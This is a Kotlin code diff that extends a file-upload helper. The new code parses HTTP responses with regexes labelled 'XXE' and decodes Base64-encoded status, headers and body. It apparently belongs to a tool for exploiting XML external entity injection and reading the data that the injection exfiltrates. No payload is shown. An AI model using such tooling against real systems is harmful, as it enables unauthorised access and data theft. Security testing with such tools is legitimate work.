@@ -22,6 +22,7 @@ import org.apache.http.entity.ContentType
 import org.apache.http.entity.mime.MultipartEntityBuilder
 import org.apache.http.util.EntityUtils
 import java.net.URI
+import java.util.Base64
 
 private const val HTTP_HEADER_CONTENT_LENGTH = "Content-Length"
 
@@ -145,10 +146,30 @@ fun uploadFile(file: File, urlString: URI) {
       val entity: HttpEntity? = response.entity
       entity?.let {
         println("--- BODY ---")
-        println(EntityUtils.toString(it))
+        val responseBody = EntityUtils.toString(it)
+        println(responseBody)
+        val fullMatch = xxeRegexFull.find(responseBody)
+        if (fullMatch != null) {
+          val status = fullMatch.groups[1]!!.value
+          println("--- XXE STATUS ---")
+          println(status)
+
+          val headers = fullMatch.groups[2]!!.value
+          println("--- XXE HEADERS ---")
+          println(Base64.getDecoder().decode(headers).decodeToString())
+
+          val body = fullMatch.groups[3]!!.value
+          println("--- XXE BODY ---")
+          println(Base64.getDecoder().decode(body).decodeToString())
+        } else {
+          TODO()
+        }
       }
     }
   } finally {
     httpClient.close()
   }
 }
+
+val xxeRegexFull = Regex("'Status: (\\d+), Headers: (.*), Body: (.*)'")
+val xxeRegexObrez = Regex("'Status: (\\d+), Headers: (.*)'")
